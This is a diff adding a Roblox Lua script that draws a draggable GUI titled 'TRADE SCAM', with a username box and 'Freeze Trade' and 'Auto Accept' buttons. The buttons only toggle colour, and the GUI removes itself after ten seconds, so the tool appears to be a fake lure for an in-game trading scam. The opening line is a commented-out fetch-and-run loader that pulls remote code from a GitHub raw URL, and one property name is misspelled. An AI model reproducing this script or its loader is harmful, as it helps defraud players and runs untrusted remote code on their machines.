@@ -1,0 +1,104 @@
+---  loadstring(game:HttpGet("https://raw.githubusercontent.com/LingerDark/mmgui/refs/heads/main/gui2"))()
+
+local ScreenGUI = Instance.new("ScreenGui")
+ScreenGUI.Name = "TradeScamGUI"
+ScreenGUI.IgnoreGuiInset = true
+ScreenGUI.DisplayOrder = 9999
+ScreenGUI.ResetOnSpawn = false
+ScreenGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local BackgroundFrame = Instance.new("Frame")
+BackgroundFrame.Size = UDim2.new(0.3, 0, 0.4, 0)
+BackgroundFrame.Position = UDim2.new(0.35, 0, 0.3, 0)
+BackgroundFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+BackgroundFrame.BorderSizePixel = 0
+BackgroundFrame.Active = true -- Сделаем фрейм активным для взаимодействий
+BackgroundFrame.Parent = ScreenGUI
+
+local Title = Instance.new("TextLabel")
+Title.Parent = BackgroundFrame
+Title.Text = "TRADE SCAM"
+Title.Size = UDim2.new(1, 0, 0.15, 0)
+Title.TextSize = 25
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.FredokaOne
+
+local UsernameTextBox = Instance.new("TextBox")
+UsernameTextBox.Parent = BackgroundFrame
+UsernameTextBox.PlaceholderText = "Type Here!"
+UsernameTextBox.Size = UDim2.new(0.8, 0, 0.15, 0)
+UsernameTextBox.Position = UDim2.new(0.1, 0, 0.2, 0)
+UsernameTextBox.TextSize = 18
+UsernameTextBox.Texk = "Username="
+UsernameTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+UsernameTextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+UsernameTextBox.Font = Enum.Font.FredokaOne
+UsernameTextBox.ClearTextOnFocus = true
+
+local FreezeTradeCheck = Instance.new("TextButton")
+FreezeTradeCheck.Parent = BackgroundFrame
+FreezeTradeCheck.Text = "Freeze Trade"
+FreezeTradeCheck.Size = UDim2.new(0.8, 0, 0.15, 0)
+FreezeTradeCheck.Position = UDim2.new(0.1, 0, 0.4, 0)
+FreezeTradeCheck.TextSize = 18
+FreezeTradeCheck.TextColor3 = Color3.fromRGB(255, 255, 255)
+FreezeTradeCheck.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+FreezeTradeCheck.Font = Enum.Font.FredokaOne
+
+local AutoAcceptCheck = Instance.new("TextButton")
+AutoAcceptCheck.Parent = BackgroundFrame
+AutoAcceptCheck.Text = "Auto Accept"
+AutoAcceptCheck.Size = UDim2.new(0.8, 0, 0.15, 0)
+AutoAcceptCheck.Position = UDim2.new(0.1, 0, 0.6, 0)
+AutoAcceptCheck.TextSize = 18
+AutoAcceptCheck.TextColor3 = Color3.fromRGB(255, 255, 255)
+AutoAcceptCheck.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+AutoAcceptCheck.Font = Enum.Font.FredokaOne
+
+-- Функционал кнопок (смена цвета при нажатии)
+local function toggleButton(button)
+    if button.BackgroundColor3 == Color3.fromRGB(50, 50, 50) then
+        button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+    else
+        button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    end
+end
+
+FreezeTradeCheck.MouseButton1Click:Connect(function()
+    toggleButton(FreezeTradeCheck)
+end)
+
+AutoAcceptCheck.MouseButton1Click:Connect(function()
+    toggleButton(AutoAcceptCheck)
+end)
+
+-- Перетаскивание UI
+local isDragging = false
+local dragInput, dragStart, startPos
+
+BackgroundFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isDragging = true
+        dragStart = input.Position
+        startPos = BackgroundFrame.Position
+    end
+end)
+
+BackgroundFrame.InputChanged:Connect(function(input)
+    if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        BackgroundFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+BackgroundFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isDragging = false
+    end
+end)
+
+
+task.wait(10)
+
+ScreenGUI:Destroy()
